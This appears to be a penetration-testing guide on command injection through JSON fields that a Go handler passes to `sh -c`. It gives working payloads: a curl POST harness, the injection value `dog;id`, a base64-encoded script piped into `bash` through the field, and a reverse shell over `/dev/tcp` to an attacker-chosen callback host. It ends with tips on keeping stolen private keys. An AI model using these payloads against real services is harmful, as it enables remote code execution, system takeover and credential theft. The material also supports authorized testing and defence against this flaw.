# JSON fields passed to an explicit shell

Use after recovering the selected request handler or equivalent runtime evidence. Required inputs are the scoped endpoint/session, actual JSON field names and types, the traced process invocation and the authorized test effect. A POST can create a persistent application record even when its child command fails; arrange the intended record/state handling before retrying.

## Follow the data to the process

Trace route, middleware, JSON decoding, selected field and process creation. In a Go handler, `exec.Command("sh", "-c", "cat characteristics/"+species)` explicitly invokes a shell: a semicolon in `species` starts another command. Ordinary Go `exec.Command` with separate arguments does **not** invoke a shell automatically. Confirm the actual deployed handler where possible; an acquired repository is a source lead, not proof that its build is running.

If the process uses `CombinedOutput`, stdout and stderr can mix. A wrapper that returns `err.Error()` on failure can discard otherwise useful command output, while the outer HTTP handler still returns 200. Inspect how the result is placed in response fields or later GET records. Missing text, JSON success and shell-command success are distinct observations.

For a JSON POST, define `url`, fresh private `request`/`headers`/`response` paths, and `species_value` as the selected benign baseline or exact reviewed test string. This example uses the evidenced `name`/`species` fields; adapt to the actual schema:

~~~bash
umask 077
python3 - "$species_value" > "$request" <<'PY' &&
import json, sys
json.dump({"name":"selected-probe","species":sys.argv[1]},sys.stdout)
PY
curl --silent --show-error --connect-timeout 5 --max-time 30 --header 'Content-Type: application/json' --data-binary "@$request" --dump-header "$headers" --output "$response" --write-out 'status=%{http_code}\n' "$url"
~~~

JSON encoding handles embedded quotes; shell quoting alone does not. The header is `Content-Type: application/json`, without literal quotes around its name. Capture status/body from that request, then inspect the selected record through the established read route if the POST response only acknowledges creation.

For a permitted execution-marker test of that exact shell construction, a value such as `dog;id` leaves the initial file read and then requests process identity. Treat the resulting UID/GID as evidence of the handler's child execution context only. Do not infer it from an unchanged API status or a preexisting record. Another handler may filter, escape or pass the field as an ordinary argument, which requires a different conclusion.

## Selected encoded script or callback

Base64 can carry a reviewed shell script without troublesome JSON metacharacters; it does not remove command execution or make an untrusted input safe. Define `script` as the exact authorized script and `encoded` as a fresh path:

~~~bash
base64 --wrap=0 "$script" > "$encoded" &&
species_value="dog;printf '%s' '$(cat "$encoded")'|base64 -d|bash"
~~~

Construct the JSON and send it with the same capture procedure. GNU `--wrap=0` avoids line wrapping; file encoding avoids echo's extra newline. Preserve the chosen bytes and interpreters: a successful decode is not proof that Bash started or the script completed. Confirm expected result/state before another POST; a timeout can occur after execution has already begun.

If the authorized objective specifically needs a shell callback, define a validated callback IP/hostname and decimal port reachable **from the service**, start the selected listener, and use a reviewed script such as:

~~~bash
cat > "$script" <<EOF
bash -c 'bash -i >& /dev/tcp/$callback_host/$callback_port 0>&1'
EOF
~~~

This relies on Bash's TCP redirection and the service's available Bash/network route. It can hold the HTTP request open; a received connection alone is not proof of a working shell. Confirm process identity and the selected task's result through that session, then track its termination and any test record separately. Keep failure causes distinct: body parsing, shell quoting, executable availability, outbound routing, listener binding and callback identity.

For acquired text/private keys, retain complete bytes rather than pasting a snipped display. Strip only an established transport prefix from selected lines, parse the resulting artifact and restrict its working-copy access. Possessing a key file does not prove current SSH authorization.

References: [Go process invocation and CombinedOutput](https://pkg.go.dev/os/exec), [curl request options](https://curl.se/docs/manpage.html), [Bash redirections](https://www.gnu.org/software/bash/manual/html_node/Redirections.html).
